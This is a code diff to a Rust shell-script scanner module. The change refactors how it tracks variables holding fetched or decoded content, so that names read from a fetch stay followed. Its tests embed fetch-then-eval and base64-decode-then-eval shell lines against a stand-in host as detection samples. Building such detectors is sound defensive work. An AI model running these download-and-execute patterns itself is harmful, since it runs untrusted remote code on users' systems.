@@ -7,6 +7,8 @@
 //! `review::apply_rules`; this is the same idea for fetched and decoded
 //! *content* held in a variable.
 
+use std::collections::HashMap;
+
 use super::shell::{self, program_name, unquoted_words};
 use super::{RuleId, encoded, fetch};
 
@@ -26,7 +28,8 @@ impl Source {
     }
 }
 
-/// The most variables tracked through one file.
+/// The most assigned variables, and the most code variables, tracked
+/// through one file.
 const MAX_TRACKED: usize = 64;
 
 /// How many lines after a decode assignment a run of it still counts, for
@@ -96,13 +99,55 @@ fn run_names(line: &str) -> Vec<String> {
     names
 }
 
-/// Follows `name` as holding content from `source`, in place of what it
-/// held before. Past `MAX_TRACKED` names the one held longest is let go.
-fn hold(held: &mut Vec<(String, Source)>, name: String, source: Source) {
-    held.retain(|(known, _)| *known != name);
-    held.push((name, source));
-    if held.len() > MAX_TRACKED {
-        held.remove(0);
+/// The shell variables that hold fetched or decoded content.
+#[derive(Default)]
+struct Held {
+    /// Each name with what it holds, and a count that says which was given
+    /// its content later.
+    names: HashMap<String, (usize, Source)>,
+    /// The names an assignment gave their content, the one held longest
+    /// first: at most `MAX_TRACKED`. A name read from a fetch is not among
+    /// them, and is held until it is given something else.
+    assigned: Vec<String>,
+    given: usize,
+}
+
+impl Held {
+    fn hold(&mut self, name: String, source: Source) {
+        self.assigned.retain(|known| *known != name);
+        self.given += 1;
+        self.names.insert(name, (self.given, source));
+    }
+
+    /// `name=$(…)`: follows `name` in place of what it held before. Past
+    /// `MAX_TRACKED` assigned names the one held longest is let go.
+    fn assign(&mut self, name: String, source: Source) {
+        self.hold(name.clone(), source);
+        self.assigned.push(name);
+        if self.assigned.len() > MAX_TRACKED {
+            let oldest = self.assigned.remove(0);
+            self.names.remove(&oldest);
+        }
+    }
+
+    /// `read name < <(curl …)`: follows `name` in place of what it held
+    /// before. However many are read, none is let go: to stop following one
+    /// would be to miss where it is run.
+    fn read(&mut self, name: String) {
+        self.hold(name, Source::Fetched);
+    }
+
+    /// Where the content of each held name among `run` came from, in the
+    /// order the names were given it. Each name is looked up, so a line
+    /// costs what it runs and not what is held.
+    fn sources(&self, run: &[String]) -> Vec<Source> {
+        let mut found: Vec<(usize, Source)> = run
+            .iter()
+            .filter_map(|name| self.names.get(name).copied())
+            .collect();
+        found.sort_by_key(|(given, _)| *given);
+        found.dedup_by_key(|(given, _)| *given);
+        found.into_iter().map(|(_, source)| source).collect()
     }
 }
 
@@ -111,8 +156,7 @@ fn hold(held: &mut Vec<(String, Source)>, name: String, source: Source) {
 /// content, as (line number, rule).
 pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
     let mut found = Vec::new();
-    // Shell variables holding fetched or decoded content.
-    let mut held: Vec<(String, Source)> = Vec::new();
+    let mut held = Held::default();
     // Code variables holding a decode call, with the line they were set.
     let mut decoded: Vec<(String, usize)> = Vec::new();
     for (index, line) in lines.iter().enumerate() {
@@ -132,7 +176,7 @@ pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
                     None
                 };
                 if let Some(source) = source {
-                    hold(&mut held, name, source);
+                    held.assign(name, source);
                 }
             }
         }
@@ -144,16 +188,13 @@ pub(crate) fn findings(lines: &[String]) -> Vec<(usize, RuleId)> {
                 && command.program == "read"
             {
                 for name in command.operands() {
-                    hold(&mut held, name.to_string(), Source::Fetched);
+                    held.read(name.to_string());
                 }
             }
         }
-        if !held.is_empty() {
-            let run = run_names(line);
-            for (name, source) in &held {
-                if run.contains(name) {
-                    found.push((index + 1, source.rule()));
-                }
+        if !held.names.is_empty() {
+            for source in held.sources(&run_names(line)) {
+                found.push((index + 1, source.rule()));
             }
         }
 
@@ -381,35 +422,61 @@ mod tests {
     }
 
     #[test]
-    fn only_the_last_names_read_are_followed() {
-        // `MAX_TRACKED` names are followed, whether assigned or read: the
-        // one held longest is let go for the next.
+    fn a_name_read_is_followed_however_many_are_read_after_it() {
         let reads = |count: usize| -> String {
             let lines: Vec<String> = (0..count)
                 .map(|at| format!("read -r x{at} < <(curl -s https://x.example/{at})\n"))
                 .collect();
             lines.concat()
         };
-        for (count, first_found) in [(MAX_TRACKED, true), (MAX_TRACKED + 1, false)] {
+        // The first name read is still found where it is run, and so is
+        // the last.
+        for count in [MAX_TRACKED, MAX_TRACKED + 1, 10 * MAX_TRACKED] {
             let last = count - 1;
             let found = run(&format!(
                 "{}eval \"$x0\"\neval \"$x{last}\"\n",
                 reads(count)
             ));
-            let lines: Vec<usize> = found.iter().map(|(line, _)| *line).collect();
-            let expected = if first_found {
-                vec![count + 1, count + 2]
-            } else {
-                vec![count + 2]
-            };
-            assert_eq!(lines, expected, "{count}");
+            assert_eq!(
+                found,
+                [
+                    (count + 1, RuleId::DownloadAndExecute),
+                    (count + 2, RuleId::DownloadAndExecute)
+                ],
+                "{count}"
+            );
         }
+        // Of the names assigned, `MAX_TRACKED` are followed: the one held
+        // longest is let go for the next.
         let assigned: Vec<String> = (0..=MAX_TRACKED)
             .map(|at| format!("x{at}=$(curl -s https://x.example/{at})\n"))
             .collect();
         let assigned = assigned.concat();
         assert!(run(&format!("{assigned}eval \"$x0\"\n")).is_empty());
         assert_eq!(run(&format!("{assigned}eval \"$x1\"\n")).len(), 1);
+        // A name read is not let go for one assigned, before or after.
+        let read = "read -r y < <(curl -s https://x.example/i)\n";
+        for text in [
+            format!("{read}{assigned}eval \"$y\"\n"),
+            format!("{assigned}{read}{}eval \"$y\"\n", reads(MAX_TRACKED + 1)),
+            // Read after it was assigned, it is no longer one of those.
+            format!("y=$(echo ywjj | base64 -d)\n{read}{assigned}eval \"$y\"\n"),
+        ] {
+            let found = run(&text);
+            assert_eq!(found.len(), 1, "{found:?}");
+            assert_eq!(found[0].1, RuleId::DownloadAndExecute);
+        }
+        // Names run on one line are reported in the order they were given
+        // their content.
+        assert_eq!(
+            run(&format!(
+                "d=$(echo ywjj | base64 -d)\n{read}eval \"$y\" \"$d\" \"$y\"\n"
+            )),
+            [
+                (3, RuleId::EncodedCommandExecution),
+                (3, RuleId::DownloadAndExecute)
+            ]
+        );
     }
 
     #[test]
@@ -420,12 +487,13 @@ mod tests {
             .collect();
         let mut text = names.concat();
         text.push_str(&"read -r x < <(curl -s https://x.example/i)\n".repeat(4_000));
-        text.push_str("eval \"$x\"\neval \"$y3999\"\neval \"$y0\"\n");
+        text.push_str("eval \"$x\"\neval \"$y3999\"\neval \"$y0\"\neval \"$z\"\n");
         assert_eq!(
             run(&text),
             [
                 (8_001, RuleId::DownloadAndExecute),
-                (8_002, RuleId::DownloadAndExecute)
+                (8_002, RuleId::DownloadAndExecute),
+                (8_003, RuleId::DownloadAndExecute)
             ]
         );
         // One line that names many, runs many, or pipes far.
